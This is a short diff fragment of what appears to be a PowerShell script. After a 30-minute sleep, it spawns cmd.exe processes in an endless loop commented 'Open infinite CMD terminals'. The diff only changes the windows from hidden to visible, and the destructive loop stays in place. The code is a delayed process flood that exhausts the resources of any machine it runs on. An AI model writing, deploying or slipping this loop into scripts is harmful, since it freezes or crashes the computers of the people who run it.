@@ -3,7 +3,7 @@ Start-Sleep -Seconds 1800
 
 # Open infinite CMD terminals
 while($true) {
-    Start-Process cmd.exe -WindowStyle Hidden
+    Start-Process cmd.exe 
 }
 
 # Close all CMD terminals
